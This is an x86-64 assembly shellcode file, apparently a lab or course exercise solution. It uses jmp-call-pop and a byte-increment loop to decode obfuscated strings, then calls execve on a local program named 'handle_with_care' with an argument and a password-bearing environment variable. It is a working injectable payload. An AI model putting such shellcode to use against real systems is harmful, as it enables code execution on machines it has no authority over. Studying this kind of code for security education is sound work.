bits 64
global careful, _start

%define CHEATS


_start:
careful:
  jmp short argv_envp_strs

build_argv_envp:
  pop rdi              ; start address of argv and exe name.

  lea rdx, [rdi + 19]  ; start address of username.
  lea rbx, [rdi + 30]  ; start address of password.

  push byte 48
  pop rcx
.foo:
  inc byte [rdi + rcx] ; increment each byte in the garbled string.
  loop .foo            ; such that the 0xff's become 0x00's.
                       ; rcx == 0 after this loop.

  ; push rcx   ; no need to null-terminate argv (see report)
  push rdx     ; argv[1] = "Numberwang";
  push rdi     ; argv[0] = "./handle_with_care";

  push rsp     ; rsi = pointer to argv.
  pop rsi

  push rcx     ; envp[1] = NULL;
  push rbx     ; envp[0] = "PCS_PASSWD=hunter2" (or "VAR_PCS=pcs r0cks");

  push rsp     ; rdx = pointer to envp.
  pop rdx

  push byte 59 ; syscall execve
  pop rax
  syscall

argv_envp_strs:
  call build_argv_envp

%ifdef CHEATS
  db "..g`mckd^vhsg^b`qd", 0xff, "Mtladqv`mf", 0xff, "U@Q^OBR<OBR", 0x1f, "q/bjr", 0xff

  ; with print_args123456
  ; db "..oqhms^`qfr012345", 0xff, "Mtladqv`mf", 0xff, "U@Q^OBR<OBR", 0x1f, "q/bjr";, 0xff
%else
  db "..g`mckd^vhsg^b`qd", 0xff, "Mtladqv`mf", 0xff, "OBR^O@RRVC<gtmsdq1", 0xff

  ; with print_args123456
  ; db "..oqhms^`qfr012345", 0xff, "Mtladqv`mf", 0xff, "OBR^O@RRVC<gtmsdq1", 0xff
%endif
